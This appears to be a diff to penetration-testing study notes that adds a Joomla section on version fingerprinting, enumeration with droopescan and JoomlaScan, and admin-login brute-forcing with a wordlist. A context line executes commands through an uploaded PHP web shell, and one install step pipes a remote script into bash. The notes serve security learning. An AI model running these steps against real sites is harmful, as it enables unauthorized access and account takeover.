@@ -200,3 +200,54 @@ The exploit as written may fail, but we can use cURL to execute commands using t
 curl -s http://blog.company.local/wp-content/uploads/2021/08/zeeaygvkeodlgvt-1762181484.7355.php?cmd=id
 ```
 
+# Joomla
+
+## Discovery
+
+```
+curl -s http://dev.company.local/ | grep Joomla
+```
+
+Check the robots.txt file.
+
+```
+curl -s http://dev.company.local/README.txt | head -n 5
+```
+
+In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.
+
+```
+-s http://dev.company.local/administrator/manifests/files/joomla.xml | xmllint --format -
+```
+The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml.
+
+## Enumeration
+We cab try out [droopescan](https://github.com/SamJoan/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
+```
+sudo pip3 install droopescan
+```
+```
+droopescan -h
+```
+run a scan:
+```
+droopescan scan joomla --url http://dev.company.local/
+```
+We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. 
+Installation of Python2.7:
+```
+curl https://pyenv.run | bash
+```
+Or if that version is already installed, we can directly use the `pyenv shell 2.7` command to use python2.7.
+Then:
+```
+python2.7 -m pip install urllib3
+```
+Running a scan:
+```
+python2.7 joomlascan.py -u http://dev.company.local
+```
+## Brute-frocing
+```
+sudo python3 joomla-brute.py -u http://dev.company.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
